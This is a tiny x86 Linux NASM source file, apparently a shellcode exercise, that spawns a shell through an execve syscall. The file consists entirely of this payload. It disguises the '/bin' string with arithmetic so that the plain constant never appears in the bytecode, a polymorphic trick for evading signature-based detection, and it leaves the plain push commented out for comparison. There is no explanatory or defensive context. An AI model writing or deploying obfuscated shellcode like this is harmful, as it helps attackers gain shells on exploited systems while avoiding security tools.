; Filename: poly_execve.nasm
; Author: wfscs3

global _start

section .text
_start:

	xor eax, eax
	push eax
	push 0x68732f2f
	mov edi, 0x7a6c6f6c
	sub edi, 0x0c030d3d
	push edi
	;push 0x6e69622f
	xchg ebx, esp
	mov al, 0xb
	int 0x80
